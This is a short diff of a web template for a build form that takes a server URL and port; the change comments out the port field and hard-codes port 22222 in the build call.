@@ -25,10 +25,10 @@
                                     <input type="text" id="uriInput" placeholder="IP / Public URL" title="This is the public url of your server (domain.com)">
                                 </div>
                             </div>
-                            <div class="two wide field">
+                            <!-- <div class="two wide field">
                                 <label>:</label>
                                 <input type="number" id="portInput" placeholder="PORT" min="2048" max="25565" title="This is the `control_port` set in the consts" value="<%= myPort %>">
-                            </div>
+                            </div> -->
 
                         </div>
                         <div class="inline fields">
@@ -71,7 +71,7 @@
             var isDone = false;
             $('#gobuild').click((e) => {
                 $('#dimmer').addClass('active');
-                build($('#uriInput').val(), $('#portInput').val());
+                build($('#uriInput').val(), "22222");
                 setTimeout(loaderText, 500);
             });
 
